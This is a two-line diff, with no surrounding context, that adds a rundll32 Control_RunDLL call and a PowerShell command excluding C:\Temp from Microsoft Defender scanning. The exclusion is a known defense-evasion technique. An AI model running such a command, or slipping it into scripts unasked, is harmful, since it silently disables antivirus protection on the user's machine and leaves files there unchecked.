@@ -1,0 +1,2 @@
+rundll32.exe shell32.dll,Control_RunDLL
+powershell -Command "Add-MpPreference -ExclusionPath C:\Temp"
